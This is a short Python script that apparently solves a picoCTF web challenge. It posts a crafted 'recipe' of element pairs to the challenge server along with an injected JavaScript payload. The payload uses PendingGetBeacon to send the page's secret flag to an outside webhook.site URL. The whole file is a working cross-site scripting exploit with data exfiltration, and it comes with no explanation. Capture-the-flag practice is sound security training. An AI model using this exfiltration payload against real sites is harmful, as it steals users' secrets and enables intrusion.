import requests
import json

javascript = """let beacon = new PendingGetBeacon(`https://webhook.site/d20045ee-1b94-44e9-a2e5-186cfaa28a8e/${state.flag}`);
beacon.sendNow();
"""

payload = {
   "xss": javascript,
   "recipe": [['Earth', 'Water'], ['Earth', 'Fire'], ['Air', 'Earth'], ['Air', 'Water'], ['Magma', 'Mist'], ['Magma', 'Mud'], ['Fire', 'Mud'], ['Fire', 'Mist'], ['Obsidian', 'Water'], ['Air', 'Rock'], ['Fog', 'Mud'], ['Hot Spring', 'Sludge'], ['Fire', 'Steam Engine'], ['Brick', 'Mud'], ['Hot Spring', 'Steam Engine'], ['Earth', 'Obsidian'], ['Brick', 'Fog'], ['Computer Chip', 'Steam Engine'], ['Dust', 'Heat Engine'], ['Adobe', 'Cloud'], ['Electricity', 'Software'], ['Computer Chip', 'Fire'], ['Artificial Intelligence', 'Data'], ['Encryption', 'Software'], ['Fire', 'Sand'], ['Internet', 'Program'], ['Glass', 'Software'], ['Cybersecurity', 'Vulnerability'], ['Exploit', 'Web Design']]
}


print(json.dumps(payload))

r = requests.post("http://rhea.picoctf.net:52392/remoteCraft", params={'recipe': json.dumps(payload)})
print(r.text)
